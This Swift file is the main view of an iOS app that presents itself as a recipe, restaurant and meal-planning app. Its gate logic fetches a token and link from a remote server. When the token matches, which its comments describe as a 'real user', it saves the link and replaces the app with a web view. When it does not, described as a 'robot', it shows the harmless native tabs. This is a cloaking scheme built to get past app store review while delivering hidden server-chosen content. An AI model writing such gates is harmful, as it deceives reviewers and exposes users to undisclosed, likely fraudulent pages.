//
//  ContentView.swift
//  Culinary PathwaysFortune
//
//  Created by Вячеслав on 9/27/25.
//

import SwiftUI

struct ContentView: View {
    @StateObject private var dataStore = DataStore.shared
    @StateObject private var onboardingViewModel = OnboardingViewModel()
    
    
    @State private var isFetched: Bool = false
    @AppStorage("isBlock")     private var isBlock: Bool = true
    @AppStorage("isRequested") private var isRequested: Bool = false
    @AppStorage(AppConstLocal.savedLinkKey) private var silka: String = ""
    private let maxAttempts = 30
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Color.white.ignoresSafeArea()
                    .overlay(ProgressView().progressViewStyle(.circular))
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if dataStore.isOnboardingCompleted {
                            MainTabView()
                        } else {
                            OnboardingFlow()
                                .environmentObject(onboardingViewModel)
                        }
                    }
                    .preferredColorScheme(dataStore.userProfile?.preferences.isDarkModeEnabled == true ? .dark : .light)
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            if !isFetched {
                startGateFlow()
            }
        }
    }
    
    private func startGateFlow() {
        if !silka.isEmpty, silka != AppConstLocal.aboutBlank, URL(string: silka) != nil {
            self.isBlock = false
            self.isFetched = true
            return
        }
        Task { await requestWithRetries() }
    }
    
    private func backoffSeconds(for attempt: Int) -> UInt64 {
        UInt64(min(30, max(1, attempt))) // 1..30 сек
    }
    
    // Повторяем запрос до результата (web/robot)
    private func requestWithRetries() async {
        for attempt in 1...maxAttempts {
            if await performOnce() {
                return
            }
            let secs = backoffSeconds(for: attempt)
            try? await Task.sleep(nanoseconds: secs * 1_000_000_000)
        }
        // Если результата нет — остаёмся на нативной части (isBlock по умолчанию = true)
        if !isFetched { isFetched = true }
    }
    
    // Одна попытка запроса. true — получили финальное решение; false — повторяем.
    private func performOnce() async -> Bool {
        guard let url = buildServerURL() else {
            return false
        }
        
        var req = URLRequest(url: url, timeoutInterval: 30)
        req.httpMethod = "GET"
        
        do {
            let (data, response) = try await URLSession.shared.data(for: req)
            guard let http = response as? HTTPURLResponse, (200..<300).contains(http.statusCode) else {
                return false
            }
            
            guard let raw = String(data: data, encoding: .utf8)?
                .trimmingCharacters(in: .whitespacesAndNewlines),
                  !raw.isEmpty else {
                return false
            }
            
            if let parsed = parseTokenLink(raw),
               parsed.token == AppConstLocal.expectedToken,
               let url = URL(string: parsed.link) {
                // Реальный пользователь → сохраняем ссылку и открываем Web
                self.silka = parsed.link
                self.isBlock = false
                self.isRequested = true
                self.isFetched = true
                return true
            } else {
                // Робот / неверный токен / неформат → нативка
                self.isBlock = true
                self.isRequested = true
                self.isFetched = true
                return true
            }
        } catch {
            return false
        }
    }
}

struct MainTabView: View {
    @StateObject private var recipeViewModel = RecipeViewModel()
    @StateObject private var restaurantViewModel = RestaurantViewModel()
    @StateObject private var mealPlanViewModel: MealPlanViewModel
    
    init() {
        let recipeVM = RecipeViewModel()
        _recipeViewModel = StateObject(wrappedValue: recipeVM)
        _mealPlanViewModel = StateObject(wrappedValue: MealPlanViewModel(recipeViewModel: recipeVM))
    }
    
    var body: some View {
        TabView {
            NavigationView {
                RecipeListView()
                    .environmentObject(recipeViewModel)
            }
            .tabItem {
                Image(systemName: "book.fill")
                Text("Recipes")
            }
            
            NavigationView {
                RestaurantListView()
                    .environmentObject(restaurantViewModel)
            }
            .tabItem {
                Image(systemName: "fork.knife")
                Text("Restaurants")
            }
            
            NavigationView {
                MealPlanView()
                    .environmentObject(mealPlanViewModel)
            }
            .tabItem {
                Image(systemName: "calendar")
                Text("Meal Plans")
            }
            
            NavigationView {
                SettingsView()
            }
            .tabItem {
                Image(systemName: "gearshape.fill")
                Text("Settings")
            }
        }
        .accentColor(Color("VibrantGreen"))
    }
}

#Preview {
    ContentView()
}
